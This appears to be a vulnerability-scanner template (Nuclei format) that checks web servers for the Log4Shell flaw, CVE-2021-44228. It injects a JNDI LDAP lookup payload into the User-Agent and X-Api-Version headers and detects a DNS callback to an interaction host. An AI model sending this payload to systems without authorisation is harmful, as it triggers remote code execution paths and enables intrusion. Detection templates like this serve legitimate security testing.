id: CVE-2021-44228

info:
  name: Log4Shell RCE
  author: test
  severity: critical
  tags: cve,log4j

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    headers:
      X-Api-Version: "${jndi:ldap://{{interactsh-url}}/a}"
      User-Agent: "${jndi:ldap://{{interactsh-url}}/a}"

    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: body
        words:
          - "log4j"
          - "jndi"
          - "Log4j"
        condition: or